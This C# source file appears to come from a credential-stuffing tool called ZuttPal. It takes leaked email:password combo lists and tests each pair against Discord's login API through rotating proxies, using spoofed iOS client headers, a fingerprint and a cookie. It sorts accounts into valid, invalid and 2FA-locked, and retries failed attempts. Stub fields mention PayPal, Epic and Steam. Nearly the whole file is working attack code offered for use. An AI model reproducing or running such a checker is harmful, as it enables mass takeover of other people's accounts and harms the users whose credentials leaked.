using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check38
	{
		public static string Path;
		public static string Path1;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking42.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking42.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking42.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = false;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.AddHeader("x-super-properties", "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZTExLDYiLCJjbGllbnRfdmVyc2lvbiI6IjU2LjAiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJkZXZpY2VfYWR2ZXJ0aXNlcl9pZCI6IjA5MDk0NzFBLUE2OTItNEUyOS05MEQ5LTU2REQ2NURFQjhGOCIsImRldmljZV92ZW5kb3JfaWQiOiJCNkNCQUQwMy04MkQ2LTQzMzctOEJBNi1DN0FDRTY3NTU2ODEiLCJicm93c2VyX3VzZXJfYWdlbnQiOiIiLCJicm93c2VyX3ZlcnNpb24iOiIiLCJvc192ZXJzaW9uIjoiMTIuMSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIzMzkwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==");
								httpRequest.AddHeader("x-fingerprint", "800516113988583465.bsWQo4fjDUYUiogr7XwdbFYqYa4");
								httpRequest.AddHeader("user-agent", "Discord/23390 CFNetwork/975.0.3 Darwin/18.2.0");
								httpRequest.AddHeader("cookie", "__cfduid=df24f870ebdefdc7c9c98234f5d3a98921610928313");
								httpRequest.AddHeader("authority", "discord.com");
								httpRequest.AddHeader("accept-language", "en-US");
								httpRequest.AddHeader("authorization", "undefined");
								string bytes = "{\"login\":\"" + email + "\",\"password\":\"" + password + "\",\"undelete\":false,\"captcha_key\":null}";
								string str = httpRequest.Post("https://discord.com/api/v8/auth/login", bytes, "application/json").ToString();
								if (str.Contains("token"))
								{
									Interlocked.Increment(ref Checking42.CheckedLines);
									Interlocked.Increment(ref Checking42.currentCpm);
									Interlocked.Increment(ref Checking42.Hits);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									break;
								}
								else if (str.Contains("INVALID_LOGIN"))
								{
									Interlocked.Increment(ref Checking42.CheckedLines);
									Interlocked.Increment(ref Checking42.currentCpm);
									Interlocked.Increment(ref Checking42.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
								else if (str.Contains("ACCOUNT_LOGIN_VERIFICATION_EMAIL"))
                                {
									Interlocked.Increment(ref Checking42.CheckedLines);
									Interlocked.Increment(ref Checking42.currentCpm);
									Interlocked.Increment(ref Checking42.twofa);
									if (Program.config.print2fa == "True")
									{
										Console.WriteLine("[»] 2FA - " + account, Color.Purple);
									}
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking42.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking42.retry);
								break;
							}
						}
					}
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string paypalempty = "";

		public static string epicempty = "";

		public static string steamempty = "";

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
